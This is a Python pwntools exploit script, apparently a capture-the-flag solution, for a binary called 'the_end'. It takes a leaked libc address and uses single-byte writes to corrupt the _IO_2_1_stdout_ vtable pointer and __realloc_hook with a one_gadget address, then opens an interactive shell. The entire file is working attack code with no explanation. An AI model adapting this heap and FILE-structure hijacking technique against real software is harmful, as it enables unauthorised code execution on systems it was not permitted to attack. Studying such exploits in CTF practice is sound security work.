#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./the_end')
	# bin = ELF('./exit_pwn',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
else:
	cn = remote('0',10006)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	cn.sendline('hxazene')
	pass


def z(a=''):
	# if local:
	gdb.attach('the_end',gdbscript=a,exe='./the_end')
	if a == '':
		raw_input()

cn.recvuntil('gift ')
d = cn.recvuntil(',')[:-1]
lbase = int(d,16)-libc.sym['sleep']
success('lbase: '+hex(lbase))

# z('b __run_exit_handlers\nb _IO_cleanup\nc')
# z('b execve\nc')
addr = lbase+libc.sym['_IO_2_1_stdout_']+0xd8
val = lbase+libc.got['realloc']-0x58

cn.send(p64(addr+1))
val2 = (val>>8)&0xff
cn.send(chr(val2))

cn.send(p64(addr))
val2 = (val)&0xff
cn.send(chr(val2))

addr = lbase+libc.sym['__realloc_hook']
val = lbase+0xf02a4

cn.send(p64(addr))
val2 = (val)&0xff
cn.send(chr(val2))

cn.send(p64(addr+1))
val2 = (val>>8)&0xff
cn.send(chr(val2))

cn.send(p64(addr+2))
val2 = (val>>16)&0xff
cn.send(chr(val2))

cn.interactive()